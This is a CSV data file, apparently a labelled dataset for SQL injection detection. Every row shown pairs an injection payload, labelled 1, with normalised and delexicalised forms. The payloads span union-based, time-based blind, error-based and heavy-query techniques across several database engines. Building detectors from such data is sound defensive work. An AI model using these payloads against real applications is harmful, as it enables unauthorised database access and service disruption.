payload_raw,label,source,sqli_type_hint,is_obfuscated,payload_norm,payload_delex
"1' or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and 'ntaw'  =  'ntaw",1,sqli_dataset.csv,,True,"1' or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) and 'ntaw' = 'ntaw",<NUM><STR>ntaw<STR>ntaw
"1%""   )    )    and   (  3020  =  3020  )  *6703 and    (    (   ""%""  =  """,1,sqli_dataset.csv,,False,"1%"" ) ) and ( 3020 = 3020 ) *6703 and ( ( ""%"" = """,<NUM>%<STR>%<STR>
1%'   )    )    and 4595  =  4595#,1,sqli_dataset.csv,,False,1%' ) ) and 4595 = 4595#,<NUM>%' ) ) and <NUM> = <NUM>#
"exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  1049  =  1049,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   ",1,sqli_dataset.csv,,True,"exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 1049 = 1049,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) )","exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( <NUM> = <NUM>,<NUM> ) ) ) ,0x717a767a71,0x78 ) ) x ) )"
"1   )    )    as avdz where 1881  =  1881 and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,sqli_dataset.csv,,False,"1 ) ) as avdz where 1881 = 1881 and 6510 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --","<NUM> ) ) as avdz where <NUM> = <NUM> and <NUM> = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --"
1'+  (  select 'stdl' where 4581  =  4581,1,sqli_dataset.csv,,True,1'+ ( select 'stdl' where 4581 = 4581,<NUM><STR>stdl' where <NUM> = <NUM>
1%'   )    )    and 2006  =  2006,1,sqli_dataset.csv,,False,1%' ) ) and 2006 = 2006,<NUM>%' ) ) and <NUM> = <NUM>
"1%""  )   union all select null,null,null,null,null,null,null,null--",1,sqli_dataset.csv,,False,"1%"" ) union all select null,null,null,null,null,null,null,null--","<NUM>%"" ) union all select null,null,null,null,null,null,null,null--"
1   )    )    as dqfl where 7527  =  7527,1,sqli_dataset.csv,,False,1 ) ) as dqfl where 7527 = 7527,<NUM> ) ) as dqfl where <NUM> = <NUM>
"1' in boolean mode  )   or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,sqli_dataset.csv,,False,"1' in boolean mode ) or 5356 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --","<NUM>' in boolean mode ) or <NUM> = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --"
"1""   )    )    and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",1,sqli_dataset.csv,,True,"1"" ) ) and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #","<NUM>"" ) ) and <NUM> = benchmark ( <NUM>,md5 ( 0x6d457153 ) ) #"
select case when 7717  =  7717 then 1 else null end--,1,sqli_dataset.csv,,False,select case when 7717 = 7717 then 1 else null end--,select case when <NUM> = <NUM> then <NUM> else null end--
"1%""  )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and   (  ""%""  =  """,1,sqli_dataset.csv,,True,"1%"" ) or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) ) and ( ""%"" = """,<NUM>%<STR>%<STR>
"  (  select * from generate_series  (  3906,3906,case when   (  3906  =  3906  )   then 1 else 0 end  )   limit 1  )  ",1,sqli_dataset.csv,,False,"( select * from generate_series ( 3906,3906,case when ( 3906 = 3906 ) then 1 else 0 end ) limit 1 )","( select * from generate_series ( <NUM>,<NUM>,case when ( <NUM> = <NUM> ) then <NUM> else <NUM> end ) limit <NUM> )"
"1  )   as vzyk where 5103  =  5103 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",1,sqli_dataset.csv,,False,"1 ) as vzyk where 5103 = 5103 and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --","<NUM> ) as vzyk where <NUM> = <NUM> and <NUM> = dbms_pipe.receive_message ( chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ,<NUM> ) --"
"1' or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and 'vvkl'  =  'vvkl",1,sqli_dataset.csv,,True,"1' or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) and 'vvkl' = 'vvkl",<NUM><STR>vvkl<STR>vvkl
"1'   )    )    and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   'wzrj'  =  'wzrj",1,sqli_dataset.csv,,True,"1' ) ) and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 4241 = 4241 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( 'wzrj' = 'wzrj",<NUM><STR>wzrj<STR>wzrj
"1'  )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and   (  'cogk'  =  'cogk",1,sqli_dataset.csv,,True,"1' ) or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) and ( 'cogk' = 'cogk",<NUM><STR>cogk<STR>cogk
"-1692'  )   union all select 7074,7074,7074,7074,7074,7074,7074#",1,sqli_dataset.csv,,False,"-1692' ) union all select 7074,7074,7074,7074,7074,7074,7074#","-<NUM>' ) union all select <NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>#"
1'||  (  select 'nvvm' from dual where 5567  =  5567 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo   )    )   ||',1,sqli_dataset.csv,,False,1'|| ( select 'nvvm' from dual where 5567 = 5567 rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) ) ||',<NUM><STR>nvvm<STR>
"1""  )   as sraw where 1997  =  1997 and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --",1,sqli_dataset.csv,,True,"1"" ) as sraw where 1997 = 1997 and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) --","<NUM>"" ) as sraw where <NUM> = <NUM> and ( select <NUM>* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( <NUM> = <NUM>,<NUM> ) ) ) ,0x717a767a71,0x78 ) ) s ) , <NUM>, <NUM> ) ) ) --"
"1""  )   where 9248  =  9248",1,sqli_dataset.csv,,False,"1"" ) where 9248 = 9248","<NUM>"" ) where <NUM> = <NUM>"
"1""  )   where 9855  =  9855",1,sqli_dataset.csv,,False,"1"" ) where 9855 = 9855","<NUM>"" ) where <NUM> = <NUM>"
"1 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  -- xlfz",1,sqli_dataset.csv,,False,"1 and 3707 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) -- xlfz","<NUM> and <NUM> = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) -- xlfz"
"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and    (    (   ""tbcc""  =  ""tbcc",1,sqli_dataset.csv,,False,"select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and ( ( ""tbcc"" = ""tbcc","select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and ( ( <STR> = ""tbcc"
-7345  )   union all select 3866#,1,sqli_dataset.csv,,False,-7345 ) union all select 3866#,-<NUM> ) union all select <NUM>#
"1   )    )     )   union all select null,null,null,null,null,null,null,null#",1,sqli_dataset.csv,,False,"1 ) ) ) union all select null,null,null,null,null,null,null,null#","<NUM> ) ) ) union all select null,null,null,null,null,null,null,null#"
"1%""   )    )    and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and    (    (   ""%""  =  """,1,sqli_dataset.csv,,True,"1%"" ) ) and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) and ( ( ""%"" = """,<NUM>%<STR>%<STR>
1' rlike sleep  (  5  )  #,1,sqli_dataset.csv,,False,1' rlike sleep ( 5 ) #,<NUM>' rlike sleep ( <NUM> ) #
"1   )    )    as hrks where 7637  =  7637 or elt  (  6272  =  6272,sleep  (  5   )    )   --",1,sqli_dataset.csv,,False,"1 ) ) as hrks where 7637 = 7637 or elt ( 6272 = 6272,sleep ( 5 ) ) --","<NUM> ) ) as hrks where <NUM> = <NUM> or elt ( <NUM> = <NUM>,sleep ( <NUM> ) ) --"
1' where 8469  =  8469,1,sqli_dataset.csv,,False,1' where 8469 = 8469,<NUM>' where <NUM> = <NUM>
"1'   )    )    and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (   'ngwt'  =  'ngwt",1,sqli_dataset.csv,,False,"1' ) ) and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ( 'ngwt' = 'ngwt",<NUM><STR>ngwt<STR>ngwt
"1'  )   as pkis where 3446  =  3446 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  --",1,sqli_dataset.csv,,False,"1' ) as pkis where 3446 = 3446 or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) --","<NUM>' ) as pkis where <NUM> = <NUM> or <NUM> = dbms_pipe.receive_message ( chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ,<NUM> ) --"
"1"" where 6785  =  6785 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1,sqli_dataset.csv,,False,"1"" where 6785 = 6785 and 3580 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --","<NUM>"" where <NUM> = <NUM> and <NUM> = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --"
"1%'   )    )    or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (   '%'  =  '",1,sqli_dataset.csv,,False,"1%' ) ) or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ( '%' = '",<NUM>%<STR>%<STR>
1'  )   and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     ) ,1,sqli_dataset.csv,,False,1' ) and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ),<NUM>' ) and <NUM> = dbms_utility.sqlid_to_sqlhash ( ( chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) || ( select ( case when ( <NUM> = <NUM> ) then <NUM> else <NUM> end ) from dual ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ) )
1' in boolean mode  )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )   #,1,sqli_dataset.csv,,True,1' in boolean mode ) rlike ( select ( case when ( 7689 = 7689 ) then 1 else 0x28 end ) ) #,<NUM>' in boolean mode ) rlike ( select ( case when ( <NUM> = <NUM> ) then <NUM> else 0x28 end ) ) #
"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )     )  ||'",1,sqli_dataset.csv,,True,"select benchmark ( 5000000,md5 ( 0x4c4d6142 ) ) ) ||'","select benchmark ( <NUM>,md5 ( 0x4c4d6142 ) ) ) ||'"
"-6440   )    )     )   union all select 3316,3316,3316,3316,3316,3316,3316,3316,3316,3316--",1,sqli_dataset.csv,,False,"-6440 ) ) ) union all select 3316,3316,3316,3316,3316,3316,3316,3316,3316,3316--","-<NUM> ) ) ) union all select <NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>--"
"-9924   )    )    as zgqa where 2867  =  2867 union all select 2867,2867,2867,2867,2867,2867,2867,2867,2867,2867#",1,sqli_dataset.csv,,False,"-9924 ) ) as zgqa where 2867 = 2867 union all select 2867,2867,2867,2867,2867,2867,2867,2867,2867,2867#","-<NUM> ) ) as zgqa where <NUM> = <NUM> union all select <NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>#"
1  )   as gfhf where 5804  =  5804 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --,1,sqli_dataset.csv,,False,1 ) as gfhf where 5804 = 5804 or 6793 = ( select 6793 from pg_sleep ( 5 ) ) --,<NUM> ) as gfhf where <NUM> = <NUM> or <NUM> = ( select <NUM> from pg_sleep ( <NUM> ) ) --
"1""  )   as dgzf where 4834  =  4834",1,sqli_dataset.csv,,False,"1"" ) as dgzf where 4834 = 4834","<NUM>"" ) as dgzf where <NUM> = <NUM>"
-4324 order by 1--,1,sqli_dataset.csv,,False,-4324 order by 1--,-<NUM> order by <NUM>--
"-8557 or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",1,sqli_dataset.csv,,True,"-8557 or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #","-<NUM> or <NUM> group by concat ( 0x7171706a71, ( select ( case when ( <NUM> = <NUM> ) then <NUM> else <NUM> end ) ) ,0x717a767a71,floor ( rand ( <NUM> ) *<NUM> ) ) having min ( <NUM> ) #"
end--,1,sqli_dataset.csv,,False,end--,end--
"1""   )    )     )   or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (     (  ""ugtw""  =  ""ugtw",1,sqli_dataset.csv,,False,"1"" ) ) ) or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( ( ( ""ugtw"" = ""ugtw",<NUM><STR>ugtw<STR>ugtw
1   )    )    rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and    (    (   4279  =  4279,1,sqli_dataset.csv,,True,1 ) ) rlike ( select ( case when ( 7689 = 7689 ) then 1 else 0x28 end ) ) and ( ( 4279 = 4279,<NUM> ) ) rlike ( select ( case when ( <NUM> = <NUM> ) then <NUM> else 0x28 end ) ) and ( ( <NUM> = <NUM>
1%'   )    )    rlike sleep  (  5  )  #,1,sqli_dataset.csv,,False,1%' ) ) rlike sleep ( 5 ) #,<NUM>%' ) ) rlike sleep ( <NUM> ) #
"1' and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,sqli_dataset.csv,,False,"1' and 2716 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --","<NUM>' and <NUM> = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --"
"1   )    )    as fwru where 5262  =  5262 and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",1,sqli_dataset.csv,,True,"1 ) ) as fwru where 5262 = 5262 and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 4241 = 4241 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) --","<NUM> ) ) as fwru where <NUM> = <NUM> and <NUM> = convert ( int, ( select char ( <NUM> ) +char ( <NUM> ) +char ( <NUM> ) +char ( <NUM> ) +char ( <NUM> ) + ( select ( case when ( <NUM> = <NUM> ) then char ( <NUM> ) else char ( <NUM> ) end ) ) +char ( <NUM> ) +char ( <NUM> ) +char ( <NUM> ) +char ( <NUM> ) +char ( <NUM> ) ) ) --"
"1""  )   as xwnu where 6490  =  6490 union all select null,null,null,null,null,null--",1,sqli_dataset.csv,,False,"1"" ) as xwnu where 6490 = 6490 union all select null,null,null,null,null,null--","<NUM>"" ) as xwnu where <NUM> = <NUM> union all select null,null,null,null,null,null--"
1'  )   as wpmv where 1479  =  1479 and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --,1,sqli_dataset.csv,,False,1' ) as wpmv where 1479 = 1479 and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --,<NUM>' ) as wpmv where <NUM> = <NUM> and <NUM> = ( select upper ( xmltype ( chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) || ( select ( case when ( <NUM> = <NUM> ) then <NUM> else <NUM> end ) from dual ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ) ) from dual ) --
"1 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   ",1,sqli_dataset.csv,,False,"1 and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) )","<NUM> and <NUM> = like ( <STR>,upper ( hex ( randomblob ( <NUM>/<NUM> ) ) ) )"
1' or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and 'bwtk'  =  'bwtk,1,sqli_dataset.csv,,False,1' or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) and 'bwtk' = 'bwtk,<NUM><STR>bwtk<STR>bwtk
"-8754""   )    )     )   union all select 7391,7391,7391,7391,7391,7391,7391--",1,sqli_dataset.csv,,False,"-8754"" ) ) ) union all select 7391,7391,7391,7391,7391,7391,7391--","-<NUM>"" ) ) ) union all select <NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>--"
"-4406%' union all select 9599,9599,9599,9599#",1,sqli_dataset.csv,,False,"-4406%' union all select 9599,9599,9599,9599#","-<NUM>%' union all select <NUM>,<NUM>,<NUM>,<NUM>#"
"1  )   as rnfb where 2405  =  2405 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",1,sqli_dataset.csv,,True,"1 ) as rnfb where 2405 = 2405 or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c ) ) #","<NUM> ) as rnfb where <NUM> = <NUM> or <NUM> = benchmark ( <NUM>,md5 ( 0x544d5a4c ) ) #"
1  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,1,sqli_dataset.csv,,False,1 ) or ( select * from ( select ( sleep ( 5 ) ) ) sddo ) #,<NUM> ) or ( select * from ( select ( sleep ( <NUM> ) ) ) sddo ) #
1 and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  # cykf,1,sqli_dataset.csv,,False,1 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) # cykf,<NUM> and <NUM> = cast ( ( chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ) || ( select ( case when ( <NUM> = <NUM> ) then <NUM> else <NUM> end ) ) ::text|| ( chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ) as numeric ) # cykf
